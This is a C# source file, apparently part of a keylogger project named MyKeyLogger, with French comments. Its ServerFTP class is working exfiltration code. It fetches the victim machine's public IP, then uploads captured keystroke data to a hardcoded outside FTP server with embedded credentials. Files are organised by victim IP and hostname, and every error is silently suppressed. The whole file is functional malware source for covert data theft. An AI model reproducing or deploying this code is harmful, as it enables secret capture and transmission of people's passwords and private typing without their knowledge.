using System;
using System.IO;
using System.Net;
using System.Text;

namespace MyKeyLogger
{
	public class ServerFTP
	{
		public const string IP = "86.207.198.22";

		public const string PORT = "9080";
		
		public const string SERVER = IP + ":" + PORT + "/files";

		public const string USERNAME = "keylogger";

		public const string PASSWORD = "keylogger";
		// Constructeur par defaut, il y a rien dedans
		public ServerFTP(){}
		
		// Envoie des données saisies au clavier sur le serveur FTP
		public static void ConnectionServer(string data)
		{		
			string server = null;
			string myIP = null;
			string hostname = Dns.GetHostName();
			WebClient client = new WebClient();
			
			byte[] buffer = null;
			Stream stream = null;
			FtpWebRequest ftpRequest = null;
			FtpWebResponse ftpResponse = null;
			
			try {
				
				// L'API ipify permet d'obtenir l'IP publique du poste bureautique visible depuis Internet
				myIP = client.DownloadString("https://api.ipify.org");
				
			} catch (Exception ex){
				
				//Message d'erreur : Le nom distant n'a pas pu être résolu: 'api.ipify.org'
				//Console.WriteLine(ex.Message);
				
			}

			// On poursuit le programme uniquement si le PC est connecté à Internet
			if (myIP != null) {
				
				server = "ftp://" + SERVER + "/" + myIP;
				
				try {
					
					// Initialise une instance de WebRequest
					// https://docs.microsoft.com/fr-fr/dotnet/api/system.net.webrequest.create?view=net-5.0
					ftpRequest = (FtpWebRequest)WebRequest.Create(server);
					
					// Fournit des informations d’identification
					ftpRequest.Credentials = new NetworkCredential(USERNAME, PASSWORD);
					
					// Crée un répertoire sur le serveur FTP
					// https://docs.microsoft.com/fr-fr/dotnet/api/system.net.webrequestmethods.ftp.makedirectory?view=net-5.0
					ftpRequest.Method = WebRequestMethods.Ftp.MakeDirectory;
					
					// Envoi de la requête et attente de la réponse
					// https://docs.microsoft.com/fr-fr/dotnet/api/system.net.ftpstatuscode?view=net-5.0
					// Code 226 = Spécifie que le serveur ferme la connexion de données et que l'action demandée a abouti.
					ftpResponse = (FtpWebResponse)ftpRequest.GetResponse(); 
				
					// Libère les ressources de l'objet de réponse
					ftpResponse.Close();
					
				} catch (Exception ex){
					
					//Console.WriteLine(ex.Message);
					
				}
				
				try {
					
					// Créer un fichier texte qui porte le nom du poste bureautique
					server = server + "/" + hostname + ".txt";
					
					// Initialise une nouvelle instance de WebRequest
					// https://docs.microsoft.com/fr-fr/dotnet/api/system.net.webrequest.create?view=net-5.0
					ftpRequest = (FtpWebRequest)WebRequest.Create(server);
		           
					// Fournit des informations d’identification
					ftpRequest.Credentials = new NetworkCredential(USERNAME, PASSWORD);
					
					// Ajoute un fichier sur le server FTP s'il n'existe pas
					// https://docs.microsoft.com/fr-fr/dotnet/api/system.net.webrequestmethods.ftp.appendfile?view=net-5.0
		            ftpRequest.Method = WebRequestMethods.Ftp.AppendFile;
					
		            // Envoi de la requête et attente de la réponse
					ftpResponse = (FtpWebResponse)ftpRequest.GetResponse();
					
					// Libère les ressources de l'objet de réponse
					ftpResponse.Close();
					
				} catch (Exception ex){
					
					//Console.WriteLine(ex.Message);
					
				}
			
				try {
				
					// Encode la chaîne de caractères en une séquence d'octets.
					buffer = Encoding.UTF8.GetBytes(data);
					
					// Obtenir le flux qui va contenir les données
					stream = ftpRequest.GetRequestStream();
					
					// Définit la longueur du contenu de la chaîne en cours de transfert
					ftpRequest.ContentLength = buffer.Length;	
					
					// Ecrit les données dans l’objet stream 
					stream.Write(buffer, 0, buffer.Length);
					
					// Ferme l'objet requestStream
					stream.Close();
					
					// Envoi la demande au serveur
					ftpResponse = (FtpWebResponse)ftpRequest.GetResponse();
					
					// Libère les ressources de l'objet de réponse
					ftpResponse.Close();
		
				} catch (Exception ex){

						//Console.WriteLine(ex.Message);
						
				}
			}
		}
	}	
}


